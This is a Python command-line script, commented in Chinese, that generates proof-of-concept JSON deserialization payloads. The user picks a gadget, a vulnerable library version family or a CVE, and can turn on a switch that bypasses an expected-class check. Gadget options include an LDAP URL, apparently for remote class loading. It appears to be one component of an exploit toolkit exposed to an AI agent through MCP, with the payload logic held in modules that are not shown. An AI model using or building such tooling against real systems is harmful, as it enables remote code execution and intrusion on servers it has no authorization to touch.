#!/usr/bin/env python3
"""poc_get — 生成 PoC JSON payload（不发包，对齐 MCP）。"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from tools._lib.bootstrap import ensure_src_path  # noqa: E402

ensure_src_path()

from tools._lib import cli_common, handlers  # noqa: E402


def _parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="poc_get.py",
        description="生成单个 gadget 的 JSON payload（不发包）。成功时 stdout 为 payload 字符串。",
    )
    p.add_argument(
        "family",
        choices=("1.2.47", "1.2.68", "1.2.80", "cve-2026-16723"),
    )
    p.add_argument("gadget", help="gadget id")
    p.add_argument(
        "--expect-bypass",
        action="store_true",
        help="有期望类时绕过（1.2.47→currency；1.2.68/80→wrap_currency）",
    )
    p.add_argument(
        "--options",
        default=None,
        help='gadget 参数 JSON object，例 \'{"ldap_url":"ldap://..."}\'',
    )
    return p


def main() -> None:
    args = _parser().parse_args()
    result = handlers.poc_get(
        args.family,
        args.gadget,
        expect_bypass=args.expect_bypass,
        options=cli_common.parse_json_obj(args.options, flag="--options"),
    )
    cli_common.emit(result, raw_payload=True)


if __name__ == "__main__":
    main()
